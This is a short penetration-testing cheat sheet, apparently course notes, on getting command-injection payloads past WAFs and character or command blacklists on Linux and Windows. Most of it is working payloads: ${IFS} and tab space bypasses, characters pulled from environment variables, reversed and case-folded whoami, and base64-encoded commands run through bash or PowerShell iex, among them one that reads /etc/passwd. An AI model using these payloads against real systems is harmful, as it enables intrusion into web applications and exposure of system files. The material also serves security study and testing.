# Filter Evasion

## Identifying Filters

**Filter/WAF Detection**

`If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`

**Identifying Blacklisted Character**

* Try intended input then follow by other characters slowly until we hit the error.

## Bypassing Space Filters

* Use tab instead of space `127.0.0.1%0a%09`
* Using the ($IFS) Linux Environment Variable `127.0.0.1%0a${IFS}`
  * default of this variable is a space
* Using brace expansion `127.0.0.1%0a{ls,-la}`
* More on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)

## Bypassing Other Blacklisted Characters

A very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows.

**Linux**

We can use the / character from $PATH variable

```shell-session
echo ${PATH}
/usr/local/bin:/usr/bin:/bin:/usr/games

echo ${PATH:0:1}
/
```

```shell-session
echo ${LS_COLORS:10:1}
;
```

**Windows**

Similar concept to linux, getting a character from a known variable

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%
\
```

```powershell-session
PS C:\htb> $env:HOMEPATH[0]
\
```

We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables and then pick one of them to produce a character we need.

**Character Shifting**

```bash
man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<[)

\
```

## Bypassing Blacklisted Commands

**Linux**

```bash
who$@ami
w\ho\am\i
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
$(rev<<<'imaohw')
```

Base64

```shell-session
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

**Windows**

```cmd-session
who^ami
```

```powershell-session
PS C:\htb> WhOaMi
PS C:\htb> "whoami"[-1..-20] -join ''
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
```

Base64

<pre class="language-powershell-session"><code class="lang-powershell-session"><strong>PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
</strong>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
</code></pre>

**Both**

```shell-session
w'h'o'am'i
```

```shell-session
w"h"o"am"i
```
